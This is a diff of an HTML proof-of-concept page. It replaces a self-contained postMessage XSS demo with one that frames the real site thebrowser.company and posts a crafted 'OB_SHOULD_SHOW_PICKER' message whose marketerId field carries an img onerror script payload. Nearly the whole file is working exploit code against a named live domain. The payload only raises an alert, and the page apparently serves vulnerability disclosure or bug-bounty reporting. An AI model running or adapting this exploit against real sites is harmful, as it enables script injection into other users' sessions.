@@ -1,31 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>🔥 DOM XSS PoC عبر postMessage</title>
+  <meta charset="UTF-8" />
+  <title>🔥 thebrowser.company DOM XSS PoC</title>
+  <style>
+    body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
+    iframe { border: 2px solid #888; width: 100%; height: 600px; margin-top: 20px; }
+  </style>
 </head>
 <body>
+  <h2>✅ DOM XSS Exploit via postMessage</h2>
+  <p>Domain: <code>thebrowser.company</code></p>
 
-<h3>🔥 تجربة XSS عبر postMessage</h3>
-<button onclick="sendXSS()">💥 إرسال الحمولة</button>
+  <iframe id="target" src="https://thebrowser.company" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
 
-<iframe id="target" srcdoc='
-  <div id="out">[في انتظار الرسالة]</div>
   <script>
-    window.addEventListener("message", e => {
-      if (e.data?.html) {
-        document.getElementById("out").innerHTML = e.data.html;
+    const iframe = document.getElementById("target");
+
+    const payload = `<img src=x onerror="alert('🔥 XSS Executed from GitHub PoC!')">`;
+
+    const message = {
+      message: "OB_SHOULD_SHOW_PICKER",
+      content: {
+        marketerId: [payload]
       }
-    });
+    };
+
+    iframe.onload = () => {
+      console.log("✅ iframe loaded");
+
+      setTimeout(() => {
+        console.log("🚀 Sending postMessage payload...");
+        iframe.contentWindow.postMessage(message, "*");
+      }, 1000); // slight delay to ensure page is ready
+    };
   </script>
-' style="width:100%;height:200px;border:1px solid black;"></iframe>
-
-<script>
-function sendXSS() {
-  const payload = { html: "<script>alert('🔥 XSS')</script>" };
-  document.getElementById("target").contentWindow.postMessage(payload, "*");
-}
-</script>
-
 </body>
 </html>
